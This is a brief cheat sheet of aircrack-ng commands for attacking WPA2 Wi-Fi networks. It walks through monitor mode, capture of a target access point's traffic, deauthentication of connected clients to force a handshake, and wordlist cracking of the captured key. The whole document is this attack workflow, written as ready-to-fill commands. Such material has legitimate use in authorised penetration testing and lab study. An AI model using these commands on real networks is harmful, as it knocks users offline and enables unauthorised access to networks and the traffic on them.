# Wireless cheatsheet

airmon-ng check kill
airmon-ng start [wlan0]
airodump-ng [wlan0mon]
airodump-ng --channel [channel] --bssid [bssid] --write [file] [wlan0mon]
aireplay-ng --deauth 5 -a [bssid] [wlan0mon]
aircrack-ng -a2 -b [bssid] -w [wordlist] [path.cap]
